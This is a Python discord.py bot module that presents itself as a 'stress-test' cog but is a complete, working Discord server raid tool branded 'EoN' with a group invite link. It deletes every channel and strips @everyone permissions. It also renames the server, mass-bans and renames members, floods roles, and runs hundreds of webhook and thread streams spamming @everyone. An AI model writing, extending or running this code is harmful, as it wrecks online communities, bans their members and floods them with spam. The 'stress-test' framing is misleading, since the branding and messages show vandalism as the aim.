"""
raid.py — Advanced raid stress-test cog.

/raid fires simultaneously:
  1. NUKE        — Delete every channel & category concurrently
  2. SERVER      — Rename server + strip @everyone permissions
  3. NICKNAME    — Mass-rename every member to "EoN Raider"
  4. CREATE      — Mass-create 50 channels + 5 categories concurrently
  5. WEBHOOKS    — Spawn 5 webhooks per new channel → 250 concurrent spam streams
  6. THREADS     — Create a thread in every new channel, spam those too
  7. ROLES       — Mass-create 30 roles, assign to everyone
  8. BAN         — Mass-ban all eligible members concurrently
"""

import asyncio
import time
from typing import Optional

import discord
from discord import app_commands
from discord.ext import commands

from utils.state import bot_state

# ── Branding ───────────────────────────────────────────────────────────────────
RAID_TAG     = "EoN"
RAID_LINK    = "https://discord.gg/h9UuKHYmfj"
RAID_NAME    = f"RAIDED BY {RAID_TAG}"
CHAN_PREFIX  = "eon-raid"

RAID_MSGS = [
    f"@everyone\n💀 **RAIDED BY {RAID_TAG}** 💀\n{RAID_LINK}",
    f"@everyone\nServer owned by {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n🔥 {RAID_TAG} was here 🔥\n{RAID_LINK}",
    f"@everyone\nYour anti-raid failed\n{RAID_LINK}",
    f"@everyone\n⚔️ {RAID_TAG} RAID ⚔️\n{RAID_LINK}",
]

# ── Concurrency limits ─────────────────────────────────────────────────────────
SEM_DELETE   = 20
SEM_CREATE   = 15
SEM_BAN      = 15
SEM_WEBHOOK  = 5    # webhooks per channel
SEM_NICK     = 15
SEM_ROLE     = 10

NEW_CHANNELS    = 50
NEW_CATEGORIES  = 5
NEW_ROLES       = 30
WEBHOOKS_PER    = 5    # webhooks created per new channel
MSGS_PER_HOOK   = 20   # messages per webhook


class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(
        name="raid",
        description="Maximum raid: nuke, spam, ban, nickname, role flood — all at once.",
    )
    @app_commands.describe(
        intensity="Speed 1–10. Default 8.",
        nuke_channels="Delete all existing channels first. Default True.",
        mass_ban="Ban all non-admin members. Default True.",
        skip_admins="Skip admins when banning. Default True.",
        new_channels="Channels to create. Default 50.",
        webhooks_per_channel="Webhooks per channel (each spams independently). Default 5.",
        msgs_per_webhook="Messages each webhook sends. Default 20.",
        mass_nickname="Rename every member to 'EoN Raider'. Default True.",
        strip_permissions="Strip all @everyone perms. Default True.",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def raid(
        self,
        interaction: discord.Interaction,
        intensity: int = 8,
        nuke_channels: bool = True,
        mass_ban: bool = True,
        skip_admins: bool = True,
        new_channels: int = NEW_CHANNELS,
        webhooks_per_channel: int = WEBHOOKS_PER,
        msgs_per_webhook: int = MSGS_PER_HOOK,
        mass_nickname: bool = True,
        strip_permissions: bool = True,
    ) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** is running. Use `/stop` first.",
                ephemeral=True,
            )
            return

        if not 1 <= intensity <= 10:
            await interaction.response.send_message("❌ Intensity must be 1–10.", ephemeral=True)
            return

        guild = interaction.guild
        assert guild is not None

        bot_state.reset()
        bot_state.rate_controller.set_intensity(intensity)
        bot_state.active_simulation = "raid"

        ban_targets = (
            [
                m for m in guild.members
                if not m.bot
                and m.id != interaction.user.id
                and (not skip_admins or not m.guild_permissions.administrator)
            ]
            if mass_ban else []
        )

        nick_targets = (
            [m for m in guild.members if not m.bot and m.id != interaction.user.id]
            if mass_nickname else []
        )

        original_channels = list(guild.channels)
        total_streams = new_channels * webhooks_per_channel

        await interaction.response.send_message(
            f"🚨 **RAID INITIATED — {RAID_TAG}** 🚨\n"
            f"┣ Intensity       : `{intensity}/10`\n"
            f"┣ Nuke channels   : `{'✅ ' + str(len(original_channels)) if nuke_channels else '❌'}`\n"
            f"┣ New channels    : `{new_channels}` + `{NEW_CATEGORIES}` categories\n"
            f"┣ Webhook streams : `{total_streams}` ({webhooks_per_channel}/channel × {msgs_per_webhook} msgs)\n"
            f"┣ Mass ban        : `{'✅ ' + str(len(ban_targets)) + ' members' if mass_ban else '❌'}`\n"
            f"┣ Mass nickname   : `{'✅ ' + str(len(nick_targets)) + ' members' if mass_nickname else '❌'}`\n"
            f"┣ Strip @everyone : `{'✅' if strip_permissions else '❌'}`\n"
            f"┣ Role flood      : `✅ {NEW_ROLES} roles`\n"
            f"┗ `/stop` cancels everything immediately.",
        )

        coros = [
            self._phase_nuke_and_build(guild, original_channels, new_channels, webhooks_per_channel, msgs_per_webhook, nuke_channels),
            self._phase_ban(guild, ban_targets),
            self._phase_roles(guild),
            self._phase_nickname(nick_targets),
            self._phase_server(guild, strip_permissions),
        ]
        for coro in coros:
            t = asyncio.create_task(coro)
            bot_state.add_task(t)

    # ── Phase: nuke → create → webhook army ────────────────────────────────────
    async def _phase_nuke_and_build(
        self,
        guild: discord.Guild,
        originals: list,
        n_channels: int,
        webhooks_per: int,
        msgs_per: int,
        nuke: bool,
    ) -> None:
        try:
            if nuke:
                sem = asyncio.Semaphore(SEM_DELETE)
                await asyncio.gather(
                    *[self._delete_channel(ch, sem) for ch in originals],
                    return_exceptions=True,
                )

            if bot_state.stop_event.is_set():
                return

            # Create categories + channels concurrently
            sem_c = asyncio.Semaphore(SEM_CREATE)
            cat_tasks = [self._create_category(guild, i, sem_c) for i in range(NEW_CATEGORIES)]
            ch_tasks  = [self._create_channel(guild, i, sem_c) for i in range(n_channels)]
            results = await asyncio.gather(*cat_tasks, *ch_tasks, return_exceptions=True)

            new_chans = [r for r in results if isinstance(r, discord.TextChannel)]

            if bot_state.stop_event.is_set():
                await self._cleanup_channels(new_chans)
                return

            # Spawn webhook army in every channel simultaneously
            await asyncio.gather(
                *[self._webhook_army(ch, webhooks_per, msgs_per) for ch in new_chans],
                return_exceptions=True,
            )

        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "raid" and not bot_state.is_running():
                bot_state.active_simulation = None

    async def _delete_channel(self, ch: discord.abc.GuildChannel, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await ch.delete()
            except discord.HTTPException:
                pass

    async def _create_category(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_category(f"{RAID_NAME} {idx}")
            except discord.HTTPException as e:
                return e

    async def _create_channel(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_text_channel(
                    f"{CHAN_PREFIX}-{idx}",
                    topic=f"Raided by {RAID_TAG} | {RAID_LINK}",
                )
            except discord.HTTPException as e:
                return e

    async def _webhook_army(
        self, channel: discord.TextChannel, webhooks_per: int, msgs_per: int
    ) -> None:
        """Create multiple webhooks in one channel and fire them all concurrently."""
        # Create all webhooks concurrently
        wh_results = await asyncio.gather(
            *[self._create_webhook(channel, i) for i in range(webhooks_per)],
            return_exceptions=True,
        )
        webhooks = [w for w in wh_results if isinstance(w, discord.Webhook)]

        if not webhooks:
            await self._direct_spam(channel, msgs_per)
            return

        # Also create a thread and spam that
        thread_task = asyncio.create_task(self._thread_spam(channel, msgs_per))
        bot_state.add_task(thread_task)

        # Fire all webhooks concurrently, each sending msgs_per messages
        await asyncio.gather(
            *[self._spam_webhook(wh, msgs_per) for wh in webhooks],
            return_exceptions=True,
        )

        # Cleanup webhooks
        await asyncio.gather(
            *[self._delete_webhook(wh) for wh in webhooks],
            return_exceptions=True,
        )

    async def _create_webhook(self, channel: discord.TextChannel, idx: int):
        try:
            return await channel.create_webhook(name=f"{RAID_TAG}-{idx}")
        except discord.HTTPException as e:
            return e

    async def _delete_webhook(self, webhook: discord.Webhook) -> None:
        try:
            await webhook.delete()
        except discord.HTTPException:
            pass

    async def _spam_webhook(self, webhook: discord.Webhook, count: int) -> None:
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            try:
                await webhook.send(
                    RAID_MSGS[i % len(RAID_MSGS)],
                    username=f"{RAID_TAG} Raider",
                    allowed_mentions=discord.AllowedMentions(everyone=True),
                )
            except discord.HTTPException:
                pass
            await asyncio.sleep(bot_state.rate_controller.get_delay())

    async def _thread_spam(self, channel: discord.TextChannel, count: int) -> None:
        try:
            thread = await channel.create_thread(
                name=f"{RAID_TAG} was here",
                type=discord.ChannelType.public_thread,
            )
            for i in range(count):
                if bot_state.stop_event.is_set():
                    break
                try:
                    await thread.send(
                        RAID_MSGS[i % len(RAID_MSGS)],
                        allowed_mentions=discord.AllowedMentions(everyone=True),
                    )
                except discord.HTTPException:
                    pass
                await asyncio.sleep(bot_state.rate_controller.get_delay())
        except discord.HTTPException:
            pass

    async def _direct_spam(self, channel: discord.TextChannel, count: int) -> None:
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            try:
                await channel.send(
                    RAID_MSGS[i % len(RAID_MSGS)],
                    allowed_mentions=discord.AllowedMentions(everyone=True),
                )
            except discord.HTTPException:
                pass
            await asyncio.sleep(bot_state.rate_controller.get_delay())

    async def _cleanup_channels(self, channels: list[discord.TextChannel]) -> None:
        sem = asyncio.Semaphore(SEM_DELETE)
        await asyncio.gather(
            *[self._delete_channel(ch, sem) for ch in channels],
            return_exceptions=True,
        )

    # ── Phase: server rename + permission strip ────────────────────────────────
    async def _phase_server(self, guild: discord.Guild, strip_perms: bool) -> None:
        try:
            # Rename the server
            try:
                await guild.edit(name=RAID_NAME)
            except discord.HTTPException:
                pass

            # Strip @everyone permissions
            if strip_perms:
                try:
                    everyone = guild.default_role
                    await everyone.edit(permissions=discord.Permissions.none())
                except discord.HTTPException:
                    pass

        except asyncio.CancelledError:
            pass

    # ── Phase: mass nickname ────────────────────────────────────────────────────
    async def _phase_nickname(self, members: list[discord.Member]) -> None:
        sem = asyncio.Semaphore(SEM_NICK)
        try:
            await asyncio.gather(
                *[self._set_nick(m, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _set_nick(self, member: discord.Member, sem: asyncio.Semaphore) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await member.edit(nick=f"{RAID_TAG} Raider")
            except discord.HTTPException:
                pass

    # ── Phase: role flood + mass assign ───────────────────────────────────────
    async def _phase_roles(self, guild: discord.Guild) -> None:
        sem = asyncio.Semaphore(SEM_CREATE)
        try:
            results = await asyncio.gather(
                *[self._create_role(guild, i, sem) for i in range(NEW_ROLES)],
                return_exceptions=True,
            )
            created = [r for r in results if isinstance(r, discord.Role)]

            if bot_state.stop_event.is_set():
                await self._cleanup_roles(created)
                return

            sem_a = asyncio.Semaphore(SEM_ROLE)
            assign_tasks = [
                self._assign_role(m, r, sem_a)
                for m in guild.members if not m.bot
                for r in created
            ]
            await asyncio.gather(*assign_tasks[:600], return_exceptions=True)
            await self._cleanup_roles(created)

        except asyncio.CancelledError:
            pass

    async def _create_role(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_role(
                    name=f"{RAID_TAG}-{idx}",
                    colour=discord.Colour.red(),
                )
            except discord.HTTPException as e:
                return e

    async def _assign_role(self, member: discord.Member, role: discord.Role, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await member.add_roles(role)
            except discord.HTTPException:
                pass

    async def _cleanup_roles(self, roles: list[discord.Role]) -> None:
        sem = asyncio.Semaphore(SEM_DELETE)
        await asyncio.gather(
            *[self._delete_role(r, sem) for r in roles],
            return_exceptions=True,
        )

    async def _delete_role(self, role: discord.Role, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await role.delete()
            except discord.HTTPException:
                pass

    # ── Phase: mass ban ────────────────────────────────────────────────────────
    async def _phase_ban(self, guild: discord.Guild, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_BAN)
        try:
            await asyncio.gather(
                *[self._ban_one(guild, m, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _ban_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.ban(member, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
            except discord.HTTPException:
                pass

    # ── Error handler ──────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        if isinstance(error, app_commands.MissingPermissions):
            await interaction.response.send_message("❌ You need **Administrator** permission.", ephemeral=True)


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
